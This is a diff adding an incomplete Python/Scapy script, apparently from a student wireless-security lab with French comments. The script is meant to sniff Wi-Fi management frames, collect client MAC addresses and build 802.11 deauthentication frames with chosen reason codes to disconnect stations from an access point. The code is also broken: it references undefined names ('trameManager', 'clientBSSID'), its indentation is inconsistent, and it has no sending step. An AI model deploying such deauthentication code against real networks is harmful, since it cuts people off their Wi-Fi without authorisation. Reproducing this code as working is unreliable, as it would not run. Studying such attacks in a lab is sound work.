@@ -1,0 +1,29 @@
+#!/usr/bin/env python
+#-*- coding: utf-8 -*-
+#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+#  Authors : yimnaing Kamdem && Siu Aurelien
+#  Objectif: Développer un script en Python/Scapy capable de générer et envoyer des trames de
+#            déauthentification. Le script donne le choix entre des Reason codes différents déduit
+#			 si le message doit être envoyé à la STA ou à l'AP
+
+#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+from scapy.all import *
+interface = "wlan0mon"
+accessPointBSSID = "" 
+clientsBSSID = []
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
+reasonCodes = [1,#Unspecified
+			   4,#Disassociated due to inactivity
+			   5,#Disassociated because AP is unable to handle all currently associated stations
+			   8,#Deauthenticated because sending STA is leaving BSS
+			  ]
+
+def sniffing(packetToSniff):
+      if packetToSniff.haslayer(Dot11):
+        if packetToSniff.type == 0 and packetToSniff.subtype in trameManager:
+		# on enregistre  l'adresse mac source si elle n'est pas encore present dans la liste         
+           if packetToSniff.addr2 not in clientsBSSID :
+              clientsBSSID.append(packetToSniff.addr2)
+         
+
+pkt = RadioTap() / Dot11(clientBSSID, accessPointBSSID, accessPointBSSID) / Dot11Deauth(reason=4)
